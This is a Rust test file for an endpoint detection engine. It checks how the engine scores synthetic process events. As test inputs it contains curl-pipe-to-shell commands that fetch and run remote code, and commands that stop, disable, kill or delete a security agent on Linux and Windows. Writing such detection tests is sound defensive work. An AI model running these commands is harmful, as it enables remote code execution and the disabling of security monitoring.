use detection::{Confidence, DetectionEngine, EventClass, TelemetryEvent};

fn event(pid: u32, ppid: u32, process: &str, parent: &str, command: &str) -> TelemetryEvent {
    serde_json::from_value(serde_json::json!({"ts_unix":1700000000,"event_class":"ProcessExec","pid":pid,"ppid":ppid,"uid":1000,"process":process,"parent_process":parent,"session_id":ppid,"command_line":command,"file_write":false,"container_escape":false,"container_privileged":false})).unwrap()
}

#[test]
fn pipe_matrix_and_counter() {
    for wrapped in [false, true] {
        for (url, expected) in [
            ("https://download.invalid/x", Confidence::Medium),
            ("http://download.invalid/x", Confidence::High),
            ("https://198.51.100.9/x", Confidence::High),
        ] {
            let mut engine = DetectionEngine::default_with_rules();
            let command = if wrapped {
                format!("sh -c 'curl {url} | bash'")
            } else {
                "bash".into()
            };
            let events = [
                event(200, 100, "sh", "bash", &command),
                event(201, 200, "curl", "sh", &format!("curl {url}")),
                event(202, 200, "bash", "sh", "bash"),
            ];
            let alerts: Vec<_> = events
                .iter()
                .map(|e| engine.process_event(e))
                .filter(|o| o.confidence > Confidence::None)
                .collect();
            assert_eq!(alerts.len(), 1, "wrapped={wrapped} url={url}: {alerts:?}");
            assert_eq!(
                alerts[0].confidence, expected,
                "wrapped={wrapped} url={url}"
            );
            assert_eq!(engine.pipe_alert_suppressed_total(), u64::from(wrapped));
        }
    }
}

#[test]
fn agent_stop_positive_and_excluded_ancestry() {
    let cases = [
        ("systemctl", "systemctl stop eguard-agent"),
        ("systemctl", "systemctl disable eguard-agent.service"),
        ("systemctl", "systemctl mask eguard-agent"),
        ("systemctl", "systemctl kill eguard-agent"),
        ("service", "service eguard-agent stop"),
        ("pkill", "pkill -f eguard-agent"),
        ("killall", "killall eguard-agent"),
        ("sc.exe", "sc.exe stop eguard-agent"),
        ("sc.exe", "sc.exe config eguard-agent start= disabled"),
        ("sc.exe", "sc.exe delete eguard-agent"),
        ("net.exe", "net.exe stop eguard-agent"),
        ("powershell.exe", "Stop-Service -Name eguard-agent"),
        ("taskkill.exe", "taskkill /f /im eguard-agent.exe"),
    ];
    for (process, cmd) in cases {
        let mut engine = DetectionEngine::default_with_rules();
        let e = event(200, 100, process, "bash", cmd);
        let out = engine.process_event(&e);
        assert_eq!(out.confidence, Confidence::Medium, "{cmd}: {out:?}");
        assert!(!out.signals.tamper_indicator);
        for installer in [
            "dpkg",
            "apt",
            "apt-get",
            "rpm",
            "dnf",
            "yum",
            "zypper",
            "unattended-upgrade",
            "packagekitd",
            "msiexec.exe",
            "eguard-agent-updater",
        ] {
            let mut engine = DetectionEngine::default_with_rules();
            engine.process_event(&event(98, 1, installer, "init", installer));
            engine.process_event(&event(99, 98, "sh", installer, "sh"));
            engine.process_event(&event(100, 99, "sh", "sh", "sh"));
            let out = engine.process_event(&e);
            assert_eq!(
                out.confidence,
                Confidence::None,
                "ancestor={installer} {cmd}: {out:?}"
            );
        }
    }
    for (worker, command, intermediate, control, stop_command, expected) in [
        ("bash", "bash /var/lib/eguard-agent/update/synthetic/apply-agent-update-worker.sh", "sh", "systemctl", "systemctl stop eguard-agent", Confidence::None),
        ("powershell.exe", r"powershell.exe -File C:\ProgramData\eGuard\update\apply-agent-update-worker.ps1", "cmd.exe", "sc.exe", "sc.exe stop eguard-agent", Confidence::None),
        ("powershell.exe", r"powershell.exe -File C:\ProgramData\eGuard\update\different-script.ps1", "cmd.exe", "sc.exe", "sc.exe stop eguard-agent", Confidence::Medium),
    ] {
        let mut engine = DetectionEngine::default_with_rules();
        engine.process_event(&event(98, 1, worker, "init", command));
        engine.process_event(&event(100, 98, intermediate, worker, intermediate));
        let out = engine.process_event(&event(200, 100, control, intermediate, stop_command));
        assert_eq!(out.confidence, expected, "updater ancestor: {command}");
    }
    for cmd in [
        "systemctl restart eguard-agent",
        "systemctl reload eguard-agent",
        "systemctl status eguard-agent",
        "systemctl stop eguard-agent-other",
        "systemctl stop not-eguard-agent",
        "echo systemctl stop eguard-agent",
        "Get-Service eguard-agent",
        "Stop-Service eguard-agent-other",
        "sc.exe query eguard-agent",
        "powershell.exe -Command \"Write-Output 'Stop-Service eguard-agent'\"",
    ] {
        let process = cmd.split_whitespace().next().unwrap();
        assert_eq!(
            DetectionEngine::default_with_rules()
                .process_event(&event(200, 100, process, "bash", cmd))
                .confidence,
            Confidence::None,
            "{cmd}"
        );
    }
}

#[test]
fn observed_parent_exit_and_exec_never_suppress_a_new_pipeline() {
    for exit in [false, true] {
        let mut engine = DetectionEngine::default_with_rules();
        let mut parent = event(
            200,
            100,
            "sh",
            "bash",
            "sh -c 'curl https://download.invalid/a | sh'",
        );
        assert_eq!(engine.process_event(&parent).confidence, Confidence::Medium);
        if exit {
            parent.event_class = EventClass::ProcessExit;
            engine.process_event(&parent);
        }
        parent.event_class = EventClass::ProcessExec;
        parent.command_line = Some("sh".into());
        parent.ts_unix += 1;
        engine.process_event(&parent);
        engine.process_event(&event(
            201,
            200,
            "curl",
            "sh",
            "curl https://download.invalid/b",
        ));
        assert_eq!(
            engine
                .process_event(&event(202, 200, "sh", "sh", "sh"))
                .confidence,
            Confidence::Medium
        );
    }
}
